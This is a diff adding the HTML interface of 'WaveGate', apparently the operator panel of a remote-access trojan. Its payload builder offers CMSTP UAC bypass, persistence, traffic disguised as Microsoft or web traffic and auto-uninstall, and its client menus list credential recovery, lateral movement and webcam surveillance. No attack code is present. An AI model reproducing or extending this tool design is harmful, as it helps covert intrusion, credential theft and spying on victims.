@@ -1,0 +1,1098 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>WaveGate v1.0</title>
+<link rel="stylesheet" href="styles.css">
+<!-- xterm.js for terminal emulation -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/xterm@5.3.0/css/xterm.css">
+<script src="https://cdn.jsdelivr.net/npm/xterm@5.3.0/lib/xterm.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/xterm-addon-fit@0.8.0/lib/xterm-addon-fit.min.js"></script>
+</head>
+<body>
+<canvas id="bg-canvas"></canvas>
+<div class="titlebar" data-tauri-drag-region>
+<div class="titlebar-logo">WaveGate <span class="version">v1.0</span></div>
+<div class="titlebar-buttons">
+<div class="titlebar-button minimize" id="titlebar-minimize">
+<svg viewBox="0 0 12 12"><line x1="0" y1="6" x2="12" y2="6"/></svg>
+</div>
+<div class="titlebar-button maximize" id="titlebar-maximize">
+<svg viewBox="0 0 12 12"><rect x="1" y="1" width="10" height="10"/></svg>
+</div>
+<div class="titlebar-button close" id="titlebar-close">
+<svg viewBox="0 0 12 12"><line x1="1" y1="1" x2="11" y2="11"/><line x1="11" y1="1" x2="1" y2="11"/></svg>
+</div>
+</div>
+</div>
+<div class="nav">
+<div class="nav-item active" data-tab="clients">Clients</div>
+<div class="nav-item" data-tab="builder">Builder</div>
+<div class="nav-item" data-tab="server">Server</div>
+<div class="nav-item" data-tab="logs">Logs</div>
+<div class="nav-item" data-tab="settings">Settings</div>
+</div>
+<div class="main">
+<div class="content">
+<div class="tab-content active" id="clients-tab">
+<div class="table-wrap glass-panel" style="padding:20px;border-radius:8px">
+<table>
+<thead>
+<tr>
+<th data-col="identity">Identity</th><th data-col="ip">IP</th><th data-col="geo">GeoLoc</th><th data-col="os">OS</th><th data-col="arch">Arch</th><th data-col="account">Account</th><th data-col="uptime">Up Time</th><th data-col="window">Active Window</th><th data-col="resources">CPU / RAM</th><th data-col="build">Build ID</th>
+</tr>
+</thead>
+<tbody id="tbody"></tbody>
+</table>
+</div>
+</div>
+<div class="tab-content" id="builder-tab">
+<div class="section">
+<div class="section-title">Connection Settings</div>
+<div class="form-row">
+<div class="form-group">
+<label>Primary Connection Host</label>
+<input type="text" id="primary-host" placeholder="192.168.1.100">
+</div>
+<div class="form-group">
+<label>Backup Connection Host</label>
+<input type="text" id="backup-host" placeholder="10.0.0.1">
+</div>
+<div class="form-group">
+<label>Connection Port</label>
+<input type="number" id="connection-port" placeholder="4444">
+</div>
+<div class="form-group">
+<label>Custom SNI Hostname</label>
+<input type="text" id="sni-hostname" placeholder="www.microsoft.com">
+</div>
+</div>
+<label class="checkbox" style="margin-top:12px">
+<input type="checkbox" id="use-proxy">
+<div class="check"></div>
+<span>Connect through proxy server</span>
+</label>
+<div id="proxy-fields" class="conditional-field">
+<div class="form-row">
+<div class="form-group">
+<label>Proxy Type</label>
+<div class="select-wrapper" data-name="proxy-type">
+<div class="custom-select" data-value="http">HTTP CONNECT</div>
+<div class="custom-options">
+<div class="custom-option selected" data-value="http">HTTP CONNECT</div>
+<div class="custom-option" data-value="socks5">SOCKS5</div>
+</div>
+</div>
+</div>
+<div class="form-group">
+<label>Proxy Host</label>
+<input type="text" id="proxy-host" placeholder="proxy.example.com">
+</div>
+<div class="form-group">
+<label>Proxy Port</label>
+<input type="number" id="proxy-port" placeholder="8080">
+</div>
+</div>
+<div class="form-row">
+<div class="form-group">
+<label>Proxy Username (optional)</label>
+<input type="text" id="proxy-username" placeholder="username">
+</div>
+<div class="form-group">
+<label>Proxy Password (optional)</label>
+<input type="password" id="proxy-password" placeholder="password">
+</div>
+</div>
+</div>
+<label class="checkbox" style="margin-top:12px">
+<input type="checkbox" id="websocket-mode">
+<div class="check"></div>
+<span>Use WebSocket Mode (looks like web traffic)</span>
+</label>
+<div id="websocket-fields" class="conditional-field">
+<div class="form-row">
+<div class="form-group">
+<label>WebSocket Path</label>
+<input type="text" id="websocket-path" placeholder="/ws">
+</div>
+</div>
+</div>
+<div class="form-group" style="margin-top:12px">
+<label>DNS Mode</label>
+<div class="radio-group">
+<div class="radio">
+<input type="radio" name="dns-mode" id="dns-system" checked>
+<div class="radio-dot"></div>
+<label for="dns-system">Use System DNS</label>
+</div>
+<div class="radio">
+<input type="radio" name="dns-mode" id="dns-custom">
+<div class="radio-dot"></div>
+<label for="dns-custom">Use Custom DNS</label>
+</div>
+</div>
+</div>
+<div id="custom-dns-fields" class="conditional-field">
+<div class="form-row">
+<div class="form-group">
+<label>Primary DNS</label>
+<input type="text" id="primary-dns" placeholder="8.8.8.8">
+</div>
+<div class="form-group">
+<label>Backup DNS</label>
+<input type="text" id="backup-dns" placeholder="8.8.4.4">
+</div>
+</div>
+</div>
+<div style="height:1px;background:rgba(255,255,255,.08);margin:16px 0"></div>
+<div class="section-title">Build Configuration</div>
+<div class="form-row">
+<div class="form-group">
+<label>Build ID</label>
+<input type="text" id="build-id" placeholder="2024.11.3">
+</div>
+<div class="form-group">
+<label>Output Type</label>
+<div class="select-wrapper" data-name="output">
+<div class="custom-select" data-value="64-Bit Executable (.exe)">64-Bit Executable (.exe)</div>
+<div class="custom-options">
+<div class="custom-option selected" data-value="64-Bit Executable (.exe)">64-Bit Executable (.exe)</div>
+</div>
+</div>
+</div>
+</div>
+<div style="height:1px;background:rgba(255,255,255,.08);margin:16px 0"></div>
+<div class="section-title">Startup &amp; Behavior</div>
+<label class="checkbox">
+<input type="checkbox" id="request-elevation">
+<div class="check"></div>
+<span>Process elevation on execution</span>
+</label>
+<div id="elevation-method-field" class="conditional-field">
+<div class="form-group">
+<label>Elevation Method</label>
+<div class="select-wrapper" data-name="elevation-method">
+<div class="custom-select" data-value="Request UAC">Request UAC</div>
+<div class="custom-options">
+<div class="custom-option selected" data-value="Request UAC">Request UAC</div>
+<div class="custom-option" data-value="Auto (CMSTP)">Auto (CMSTP)</div>
+</div>
+</div>
+</div>
+</div>
+<label class="checkbox">
+<input type="checkbox" id="run-on-startup" checked>
+<div class="check"></div>
+<span>Run client when computer starts</span>
+</label>
+<div id="persistence-field" class="conditional-field show">
+<div class="form-group">
+<label>Persistence Method</label>
+<div class="select-wrapper" data-name="persistence">
+<div class="custom-select" data-value="Registry autorun">Registry autorun</div>
+<div class="custom-options">
+<div class="custom-option selected" data-value="Registry autorun">Registry autorun</div>
+<div class="custom-option" data-value="Scheduled task">Scheduled task</div>
+<div class="custom-option" data-value="Startup folder">Startup folder</div>
+<div class="custom-option" data-value="Service installation">Service installation</div>
+</div>
+</div>
+</div>
+</div>
+<label class="checkbox">
+<input type="checkbox" id="clear-zone-id">
+<div class="check"></div>
+<span>Clear Zone ID at runtime</span>
+</label>
+<label class="checkbox">
+<input type="checkbox" id="prevent-sleep">
+<div class="check"></div>
+<span>Prevent automatic system sleep</span>
+</label>
+<div class="form-row" style="margin-top:12px">
+<div class="form-group">
+<label>Run Delay (seconds)</label>
+<input type="number" id="run-delay" value="0" placeholder="0">
+</div>
+<div class="form-group">
+<label>Connect Delay (seconds)</label>
+<input type="number" id="connect-delay" value="0" placeholder="0">
+</div>
+<div class="form-group">
+<label>Restart Delay (seconds)</label>
+<input type="number" id="restart-delay" value="5" placeholder="5">
+</div>
+</div>
+<div style="height:1px;background:rgba(255,255,255,.08);margin:16px 0"></div>
+<div class="section-title">Auto-Uninstall Trigger</div>
+<div class="form-group">
+<div class="select-wrapper" data-name="uninstall-trigger">
+<div class="custom-select" data-value="None">None</div>
+<div class="custom-options">
+<div class="custom-option selected" data-value="None">None</div>
+<div class="custom-option" data-value="Time/Date">Time/Date</div>
+<div class="custom-option" data-value="No server contact">No server contact</div>
+<div class="custom-option" data-value="Specific User">Specific User</div>
+<div class="custom-option" data-value="Specific Hostname">Specific Hostname</div>
+</div>
+</div>
+</div>
+<div id="trigger-time" class="conditional-field">
+<div class="form-group">
+<label>Trigger Date/Time</label>
+<input type="datetime-local" id="trigger-datetime">
+</div>
+</div>
+<div id="trigger-nocontact" class="conditional-field">
+<div class="form-group">
+<label>No Contact Duration (minutes)</label>
+<input type="number" id="nocontact-minutes" value="120" placeholder="120">
+</div>
+</div>
+<div id="trigger-user" class="conditional-field">
+<div class="form-group">
+<label>Username to Trigger</label>
+<input type="text" id="trigger-username" placeholder="administrator">
+</div>
+</div>
+<div id="trigger-hostname" class="conditional-field">
+<div class="form-group">
+<label>Hostname to Trigger</label>
+<input type="text" id="trigger-host" placeholder="YOURPC-PC">
+</div>
+</div>
+<div style="height:1px;background:rgba(255,255,255,.08);margin:16px 0"></div>
+<div class="section-title">Client Consent Settings</div>
+<label class="checkbox">
+<input type="checkbox" id="show-disclosure" checked>
+<div class="check"></div>
+<span>Show client installation disclosure dialog</span>
+</label>
+<div id="disclosure-fields" class="conditional-field show">
+<div class="form-group">
+<label>Dialog Title</label>
+<input type="text" id="disclosure-title" placeholder="Remote Support Client">
+</div>
+<div class="form-group">
+<label>Dialog Message</label>
+<textarea id="disclosure-message" placeholder="This software enables remote technical support. By clicking Accept, you consent to remote access."></textarea>
+</div>
+</div>
+<button class="btn" id="build-btn" style="margin-top:16px">Build Client</button>
+</div>
+</div>
+<div class="tab-content" id="server-tab">
+<div class="section">
+<div class="section-title">Server Configuration</div>
+<label class="checkbox">
+<input type="checkbox" id="auto-listen" checked>
+<div class="check"></div>
+<span>Auto-listen on startup</span>
+</label>
+<div style="height:1px;background:rgba(255,255,255,.08);margin:16px 0"></div>
+<div class="form-group">
+<label>Listening Ports</label>
+<div style="display:flex;gap:8px">
+<input type="number" id="port-input" placeholder="4444" style="flex:1">
+<button class="btn" onclick="addPort()">Add</button>
+</div>
+</div>
+<div class="port-list" id="port-list">
+<div class="port-item" data-port="4444">
+<label class="toggle small">
+<input type="checkbox">
+<div class="switch"></div>
+</label>
+<span class="port-number">4444</span>
+<span class="port-connections">0 connections</span>
+<span class="remove">✕</span>
+</div>
+<div class="port-item" data-port="8080">
+<label class="toggle small">
+<input type="checkbox">
+<div class="switch"></div>
+</label>
+<span class="port-number">8080</span>
+<span class="port-connections">0 connections</span>
+<span class="remove">✕</span>
+</div>
+</div>
+<div style="height:1px;background:rgba(255,255,255,.08);margin:16px 0"></div>
+<div class="section-title" style="margin-top:16px">Cryptographic Keys</div>
+<div class="form-group">
+<label>Public Key</label>
+<div class="key-field">
+<textarea class="key-input" id="pub-key" readonly></textarea>
+<div class="key-icons">
+<svg class="key-icon toggle-key" data-target="pub-key" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
+<svg class="key-icon copy-key" data-target="pub-key" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
+</div>
+</div>
+</div>
+<div class="form-group">
+<label>Private Key</label>
+<div class="key-field">
+<textarea class="key-input" id="priv-key" readonly></textarea>
+<div class="key-icons">
+<svg class="key-icon toggle-key" data-target="priv-key" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
+<svg class="key-icon copy-key" data-target="priv-key" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
+</div>
+</div>
+</div>
+<button class="btn" id="regenerate-keys-btn" style="margin-top:8px">Regenerate Keys</button>
+</div>
+</div>
+<div class="tab-content" id="logs-tab">
+<div class="section" style="flex:1;display:flex;flex-direction:column">
+<div class="section-title">Server Logs</div>
+<div class="log-container" id="log-container">
+<div class="log-entry"><span class="log-time">12:00:00</span><span class="log-msg">Server started on port 4444</span></div>
+<div class="log-entry"><span class="log-time">12:00:05</span><span class="log-msg">New client connected: user@PC-001 (192.168.1.100)</span></div>
+<div class="log-entry"><span class="log-time">12:00:10</span><span class="log-msg">Client timeout: user@PC-002</span></div>
+<div class="log-entry"><span class="log-time">12:00:15</span><span class="log-msg">Client disconnected: user@PC-001</span></div>
+</div>
+</div>
+</div>
+<div class="tab-content" id="settings-tab">
+<div class="section">
+<div class="section-title">General Settings</div>
+<label class="checkbox">
+<input type="checkbox" id="minimize-to-tray">
+<div class="check"></div>
+<span>Minimize to tray</span>
+</label>
+<label class="checkbox">
+<input type="checkbox" id="close-to-tray">
+<div class="check"></div>
+<span>Close to tray</span>
+</label>
+<label class="checkbox">
+<input type="checkbox" id="open-output-folder" checked>
+<div class="check"></div>
+<span>Open output folder after build</span>
+</label>
+<label class="checkbox">
+<input type="checkbox" id="restore-window-state" checked>
+<div class="check"></div>
+<span>Restore window state on load</span>
+</label>
+<div style="height:1px;background:rgba(255,255,255,.08);margin:16px 0"></div>
+<div class="section-title">Appearance</div>
+<div class="form-group">
+<label>Background Animation</label>
+<div class="select-wrapper" id="bg-color-wrapper" style="width:140px;">
+<div class="custom-select" id="bg-color-select">Blue</div>
+<div class="custom-options" id="bg-color-options">
+<div class="custom-option selected" data-value="blue">Blue</div>
+<div class="custom-option" data-value="purple">Purple</div>
+<div class="custom-option" data-value="green">Green</div>
+<div class="custom-option" data-value="red">Red</div>
+<div class="custom-option" data-value="orange">Orange</div>
+<div class="custom-option" data-value="cyan">Cyan</div>
+<div class="custom-option" data-value="pink">Pink</div>
+<div class="custom-option" data-value="rgb">RGB Flow</div>
+<div class="custom-option" data-value="none">None</div>
+</div>
+</div>
+</div>
+<div style="height:1px;background:rgba(255,255,255,.08);margin:16px 0"></div>
+<div class="section-title">Autorun on Client Connect</div>
+<div class="form-group">
+<label>Autorun Type</label>
+<div class="radio-group">
+<div class="radio">
+<input type="radio" name="autorun" id="cmd-radio" checked>
+<div class="radio-dot"></div>
+<label for="cmd-radio">Commands</label>
+</div>
+<div class="radio">
+<input type="radio" name="autorun" id="ps-radio">
+<div class="radio-dot"></div>
+<label for="ps-radio">PowerShell Script</label>
+</div>
+</div>
+</div>
+<div class="form-group">
+<label id="autorun-label">Autorun Commands</label>
+<textarea id="autorun-text" placeholder="whoami&#10;hostname&#10;ipconfig"></textarea>
+</div>
+<div style="height:1px;background:rgba(255,255,255,.08);margin:16px 0"></div>
+<div class="section-title">Notification Settings</div>
+<label class="checkbox">
+<input type="checkbox" id="sound-new-client" checked>
+<div class="check"></div>
+<span>Play sound on new client</span>
+</label>
+<label class="checkbox">
+<input type="checkbox" id="sound-lost-client">
+<div class="check"></div>
+<span>Play sound on lost client</span>
+</label>
+<label class="checkbox">
+<input type="checkbox" id="log-connection-events" checked>
+<div class="check"></div>
+<span>Log client connection events</span>
+</label>
+<label class="checkbox">
+<input type="checkbox" id="notify-connect" checked>
+<div class="check"></div>
+<span>Show client connection notifications</span>
+</label>
+<label class="checkbox">
+<input type="checkbox" id="notify-disconnect" checked>
+<div class="check"></div>
+<span>Show client disconnection notifications</span>
+</label>
+<div style="height:1px;background:rgba(255,255,255,.08);margin:16px 0"></div>
+<div class="expandable" id="advanced-section">
+<div class="section-title expandable-header" id="advanced-toggle">
+<span>Advanced Settings</span>
+<svg class="expand-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="6 9 12 15 18 9"/></svg>
+</div>
+<div class="expandable-content" id="advanced-content">
+<label class="checkbox">
+<input type="checkbox" id="log-exceptions">
+<div class="check"></div>
+<span>Log internal server exceptions</span>
+</label>
+<label class="checkbox">
+<input type="checkbox" id="filter-dup-uid" checked>
+<div class="check"></div>
+<span>Filter clients with duplicate UID</span>
+</label>
+<label class="checkbox">
+<input type="checkbox" id="filter-dup-ip">
+<div class="check"></div>
+<span>Filter clients with duplicate IP</span>
+</label>
+<label class="checkbox">
+<input type="checkbox" id="filter-dup-lan">
+<div class="check"></div>
+<span>Filter clients with duplicate LAN IP</span>
+</label>
+<div style="height:1px;background:rgba(255,255,255,.08);margin:16px 0"></div>
+<div class="form-row">
+<div class="form-group">
+<label>Timeout Interval (ms)</label>
+<input type="number" id="timeout-interval" value="30000" placeholder="30000">
+</div>
+<div class="form-group">
+<label>Keepalive Timeout (ms)</label>
+<input type="number" id="keepalive-timeout" value="60000" placeholder="60000">
+</div>
+</div>
+<div class="form-row">
+<div class="form-group">
+<label>Identify Timeout (ms)</label>
+<input type="number" id="identify-timeout" value="10000" placeholder="10000">
+</div>
+<div class="form-group">
+<label>Pipe Timeout (ms)</label>
+<input type="number" id="pipe-timeout" value="5000" placeholder="5000">
+</div>
+</div>
+<div class="form-row">
+<div class="form-group">
+<label>Max Clients</label>
+<input type="number" id="max-clients" value="1000" placeholder="1000">
+</div>
+<div class="form-group">
+<label>Max Connections</label>
+<input type="number" id="max-connections" value="5000" placeholder="5000">
+</div>
+</div>
+<div class="form-row">
+<div class="form-group">
+<label>Buffer Size (bytes)</label>
+<input type="number" id="buffer-size" value="65536" placeholder="65536">
+</div>
+<div class="form-group">
+<label>Max Packet Size (bytes)</label>
+<input type="number" id="max-packet-size" value="10485760" placeholder="10485760">
+</div>
+</div>
+<div class="form-group">
+<label>GC Threshold (MB)</label>
+<input type="number" id="gc-threshold" value="100" placeholder="100">
+</div>
+</div>
+</div>
+<button class="btn" style="margin-top:16px">Save Settings</button>
+</div>
+</div>
+</div>
+</div>
+<div id="ctx" class="ctx">
+<div class="ctx-item has-sub">Administration
+<div class="submenu">
+<div data-action="remote-shell">Remote Shell</div>
+<div data-action="remote-execute">Remote Execute</div>
+<div class="submenu-divider"></div>
+<div data-action="file-manager">File Manager</div>
+<div data-action="registry-editor">Registry Editor</div>
+<div data-action="process-manager">Process Manager</div>
+<div data-action="startup-manager">Startup Manager</div>
+<div data-action="services-manager">Services Manager</div>
+<div data-action="task-scheduler">Task Scheduler</div>
+<div data-action="clipboard">Clipboard Manager</div>
+<div class="submenu-divider"></div>
+<div data-action="wmi-console">WMI Console</div>
+<div data-action="system-info">System Information</div>
+</div>
+</div>
+<div class="ctx-item has-sub">Surveillance
+<div class="submenu">
+<div data-action="remote-desktop">Remote Desktop</div>
+<div data-action="screenshot">Screenshot</div>
+<div data-action="webcam">Webcam</div>
+</div>
+</div>
+<div class="ctx-item has-sub">User Interaction
+<div class="submenu">
+<div data-action="messagebox">Message Box</div>
+<div data-action="open-url">Open URL</div>
+<div data-action="chat">Chat with User</div>
+</div>
+</div>
+<div class="ctx-item has-sub">Recovery
+<div class="submenu">
+<div data-action="credentials">Credential Recovery</div>
+</div>
+</div>
+<div class="ctx-item has-sub">Network
+<div class="submenu">
+<div data-action="tcp-connections">TCP Manager</div>
+<div data-action="reverse-proxy">Reverse Proxy</div>
+<div data-action="dns-management">Hosts Manager</div>
+<div data-action="dns-cache">DNS Cache</div>
+<div data-action="lateral-movement">Lateral Movement</div>
+</div>
+</div>
+<div class="ctx-item has-sub">Client Control
+<div class="submenu">
+<div data-action="elevate">Request UAC</div>
+<div data-action="force-elevate">Force UAC</div>
+<div class="submenu-divider"></div>
+<div data-action="update">Update Client</div>
+<div data-action="reconnect">Reconnect Client</div>
+<div data-action="restart-client">Restart Client</div>
+<div data-action="disconnect">Disconnect Client</div>
+<div data-action="uninstall">Uninstall Client</div>
+</div>
+</div>
+<div class="ctx-item has-sub">System
+<div class="submenu">
+<div data-action="reboot">Reboot System</div>
+<div data-action="shutdown">Shutdown System</div>
+<div data-action="lock">Lock Workstation</div>
+<div data-action="logoff">Log Off User</div>
+</div>
+</div>
+</div>
+
+<!-- Process Manager Context Menu -->
+<div id="pm-context-menu" class="ctx">
+<div class="ctx-item" data-action="kill">Kill Process</div>
+</div>
+
+<!-- Startup Manager Popup -->
+<div id="startupmgr-overlay" class="procmgr-overlay">
+<div class="procmgr-window glass-panel">
+<div class="procmgr-header">
+<div class="procmgr-title">
+<span id="startupmgr-title-text">Startup Manager</span>
+</div>
+<div class="procmgr-controls">
+<div class="procmgr-btn close" id="startupmgr-close">✕</div>
+</div>
+</div>
+<div class="procmgr-toolbar">
+<div class="pm-search-container">
+<input type="text" class="pm-search" id="sm-search" placeholder="Search startup entries...">
+</div>
+<div class="pm-refresh-btn" id="sm-refresh" title="Refresh">↻</div>
+</div>
+<div class="procmgr-body">
+<div class="pm-table-container">
+<table class="pm-table sm-table">
+<thead>
+<tr>
+<th class="sm-col-name" data-sort="name">Name</th>
+<th class="sm-col-command" data-sort="command">Command</th>
+<th class="sm-col-location" data-sort="location">Location</th>
+</tr>
+</thead>
+<tbody id="sm-startup-list">
+<tr><td colspan="3" class="pm-loading">Loading...</td></tr>
+</tbody>
+</table>
+</div>
+</div>
+<div class="procmgr-status">
+<span id="sm-status-text">Ready</span>
+</div>
+</div>
+</div>
+
+<!-- Startup Manager Context Menu -->
+<div id="sm-context-menu" class="ctx">
+<div class="ctx-item" data-action="remove">Remove Entry</div>
+</div>
+
+<!-- TCP Connections Popup -->
+<div id="tcpmgr-overlay" class="procmgr-overlay">
+<div class="procmgr-window glass-panel" style="max-width:1000px">
+<div class="procmgr-header">
+<div class="procmgr-title">
+<span id="tcpmgr-title-text">TCP Connections</span>
+</div>
+<div class="procmgr-controls">
+<div class="procmgr-btn close" id="tcpmgr-close">✕</div>
+</div>
+</div>
+<div class="procmgr-toolbar">
+<div class="pm-search-container">
+<input type="text" class="pm-search" id="tcp-search" placeholder="Search connections...">
+</div>
+<div class="pm-refresh-btn" id="tcp-refresh" title="Refresh">↻</div>
+</div>
+<div class="procmgr-body">
+<div class="pm-table-container">
+<table class="pm-table tcp-table">
+<thead>
+<tr>
+<th class="tcp-col-local" data-sort="local">Local Address</th>
+<th class="tcp-col-remote" data-sort="remote">Remote Address</th>
+<th class="tcp-col-pid" data-sort="pid">PID</th>
+<th class="tcp-col-process" data-sort="process">Process</th>
+</tr>
+</thead>
+<tbody id="tcp-connection-list">
+<tr><td colspan="4" class="pm-loading">Loading...</td></tr>
+</tbody>
+</table>
+</div>
+</div>
+<div class="procmgr-status">
+<span id="tcp-status-text">Ready</span>
+</div>
+</div>
+</div>
+
+<!-- TCP Connections Context Menu -->
+<div id="tcp-context-menu" class="ctx">
+<div class="ctx-item" data-action="kill">Kill Process</div>
+</div>
+
+<!-- Services Manager Popup -->
+<div id="svcmgr-overlay" class="procmgr-overlay">
+<div class="procmgr-window glass-panel" style="max-width:1000px">
+<div class="procmgr-header">
+<div class="procmgr-title">
+<span id="svcmgr-title-text">Services Manager</span>
+</div>
+<div class="procmgr-controls">
+<div class="procmgr-btn close" id="svcmgr-close">✕</div>
+</div>
+</div>
+<div class="procmgr-toolbar">
+<div class="pm-search-container">
+<input type="text" class="pm-search" id="svc-search" placeholder="Search services...">
+</div>
+<div class="pm-refresh-btn" id="svc-refresh" title="Refresh">↻</div>
+</div>
+<div class="procmgr-body">
+<div class="pm-table-container">
+<table class="pm-table svc-table">
+<thead>
+<tr>
+<th class="svc-col-name" data-sort="name">Service Name</th>
+<th class="svc-col-display" data-sort="display">Display Name</th>
+<th class="svc-col-status" data-sort="status">Status</th>
+<th class="svc-col-startup" data-sort="startup">Startup Type</th>
+<th class="svc-col-pid" data-sort="pid">PID</th>
+</tr>
+</thead>
+<tbody id="svc-service-list">
+<tr><td colspan="5" class="pm-loading">Loading...</td></tr>
+</tbody>
+</table>
+</div>
+</div>
+<div class="procmgr-status">
+<span id="svc-status-text">Ready</span>
+</div>
+</div>
+</div>
+
+<!-- Services Manager Context Menu -->
+<div id="svc-context-menu" class="ctx">
+<div class="ctx-item" data-action="start">Start Service</div>
+<div class="ctx-item" data-action="stop">Stop Service</div>
+<div class="ctx-item" data-action="restart">Restart Service</div>
+</div>
+
+<!-- Task Scheduler Manager Popup -->
+<div id="taskmgr-overlay" class="procmgr-overlay">
+<div class="procmgr-window glass-panel" style="max-width:1100px">
+<div class="procmgr-header">
+<div class="procmgr-title">
+<span id="taskmgr-title-text">Task Scheduler</span>
+</div>
+<div class="procmgr-controls">
+<div class="procmgr-btn close" id="taskmgr-close">✕</div>
+</div>
+</div>
+<div class="procmgr-toolbar">
+<div class="pm-search-container">
+<input type="text" class="pm-search" id="task-search" placeholder="Search tasks...">
+</div>
+<div class="pm-refresh-btn" id="task-refresh" title="Refresh">↻</div>
+</div>
+<div class="procmgr-body">
+<div class="pm-table-container">
+<table class="pm-table task-table">
+<thead>
+<tr>
+<th class="task-col-name" data-sort="name">Name</th>
+<th class="task-col-status" data-sort="status">Status</th>
+<th class="task-col-trigger" data-sort="trigger">Trigger</th>
+<th class="task-col-nextrun" data-sort="nextrun">Next Run</th>
+<th class="task-col-lastrun" data-sort="lastrun">Last Run</th>
+<th class="task-col-lastresult" data-sort="lastresult">Result</th>
+</tr>
+</thead>
+<tbody id="task-list">
+<tr><td colspan="6" class="pm-loading">Loading...</td></tr>
+</tbody>
+</table>
+</div>
+</div>
+<div class="procmgr-status">
+<span id="task-status-text">Ready</span>
+</div>
+</div>
+</div>
+
+<!-- Task Scheduler Context Menu -->
+<div id="task-context-menu" class="ctx">
+<div class="ctx-item" data-action="run">Run Now</div>
+<div class="ctx-item" data-action="enable">Enable</div>
+<div class="ctx-item" data-action="disable">Disable</div>
+<div class="ctx-item ctx-separator" data-action="delete">Delete</div>
+</div>
+
+<!-- WMI Console Popup -->
+<div id="wmi-overlay" class="procmgr-overlay">
+<div class="procmgr-window glass-panel" style="max-width:1200px">
+<div class="procmgr-header">
+<div class="procmgr-title">
+<span id="wmi-title-text">WMI Console</span>
+</div>
+<div class="procmgr-controls">
+<div class="procmgr-btn close" id="wmi-close">✕</div>
+</div>
+</div>
+<div class="procmgr-toolbar">
+<input type="text" class="wmi-namespace-input" id="wmi-namespace" placeholder="Namespace" value="root\cimv2">
+<div class="pm-search-container" style="flex:1;">
+<input type="text" class="pm-search" id="wmi-query" placeholder="SELECT * FROM Win32_Process">
+</div>
+<div class="pm-refresh-btn" id="wmi-execute" title="Execute Query">&raquo;</div>
+</div>
+<div class="wmi-presets" style="padding:8px 12px;border-bottom:1px solid rgba(255,255,255,.1);display:flex;gap:8px;flex-wrap:wrap;">
+<button class="wmi-preset-btn" data-query="SELECT * FROM Win32_Process">Processes</button>
+<button class="wmi-preset-btn" data-query="SELECT * FROM Win32_Service">Services</button>
+<button class="wmi-preset-btn" data-query="SELECT * FROM Win32_ComputerSystem">System</button>
+<button class="wmi-preset-btn" data-query="SELECT * FROM Win32_OperatingSystem">OS</button>
+<button class="wmi-preset-btn" data-query="SELECT * FROM Win32_NetworkAdapter WHERE NetEnabled=True">Network</button>
+<button class="wmi-preset-btn" data-query="SELECT * FROM Win32_LogicalDisk">Disks</button>
+<button class="wmi-preset-btn" data-query="SELECT * FROM Win32_StartupCommand">Startup</button>
+<button class="wmi-preset-btn" data-query="SELECT * FROM Win32_UserAccount">Users</button>
+<button class="wmi-preset-btn" data-query="SELECT * FROM Win32_Share">Shares</button>
+<button class="wmi-preset-btn" data-query="SELECT * FROM Win32_Product">Installed</button>
+</div>
+<div class="procmgr-body" style="overflow:auto;">
+<div class="wmi-results" id="wmi-results" style="padding:12px;">
+<div style="color:#888;">Enter a WMI query and click Execute</div>
+</div>
+</div>
+<div class="procmgr-status">
+<span id="wmi-status-text">Ready</span>
+</div>
+</div>
+</div>
+
+<!-- DNS Cache Popup -->
+<div id="dns-overlay" class="procmgr-overlay">
+<div class="procmgr-window glass-panel" style="max-width:900px">
+<div class="procmgr-header">
+<div class="procmgr-title">
+<span id="dns-title-text">DNS Cache</span>
+</div>
+<div class="procmgr-controls">
+<div class="procmgr-btn close" id="dns-close">✕</div>
+</div>
+</div>
+<div class="procmgr-toolbar">
+<div class="pm-search-container" style="flex:1;">
+<input type="text" class="pm-search" id="dns-search" placeholder="Search entries...">
+</div>
+<button class="toolbar-btn" id="dns-add">Add Entry</button>
+<button class="toolbar-btn" id="dns-flush">Flush Cache</button>
+<div class="pm-refresh-btn" id="dns-refresh" title="Refresh">↻</div>
+</div>
+<div class="procmgr-body">
+<div class="pm-table-container">
+<table class="pm-table dns-table">
+<thead>
+<tr>
+<th class="dns-col-name" data-sort="name">Hostname</th>
+<th class="dns-col-type" data-sort="type">Type</th>
+<th class="dns-col-data" data-sort="data">Data</th>
+<th class="dns-col-ttl" data-sort="ttl">TTL</th>
+</tr>
+</thead>
+<tbody id="dns-list">
+<tr><td colspan="4" class="pm-loading">Loading...</td></tr>
+</tbody>
+</table>
+</div>
+</div>
+<div class="procmgr-status">
+<span id="dns-status-text">Ready</span>
+</div>
+</div>
+</div>
+
+<!-- DNS Cache Context Menu -->
+<div id="dns-context-menu" class="ctx">
+<div class="ctx-item" data-action="copy-hostname">Copy Hostname</div>
+<div class="ctx-item" data-action="copy-ip">Copy IP/Data</div>
+<div class="ctx-divider"></div>
+<div class="ctx-item danger" data-action="remove">Remove Entry</div>
+</div>
+
+<!-- Chat Window -->
+<div id="chat-overlay" class="chat-overlay">
+<div class="chat-window glass-panel">
+<div class="chat-header">
+<div class="chat-title">
+<span id="chat-title-text">Chat</span>
+</div>
+<div class="chat-controls">
+<div class="chat-btn close" id="chat-close">✕</div>
+</div>
+</div>
+<div class="chat-body">
+<div class="chat-messages" id="chat-messages"></div>
+</div>
+<div class="chat-input-area">
+<input type="text" class="chat-input" id="chat-input" placeholder="Type a message...">
+<button class="chat-send-btn" id="chat-send">Send</button>
+</div>
+<div class="chat-status">
+<span id="chat-status-text">Disconnected</span>
+</div>
+</div>
+</div>
+
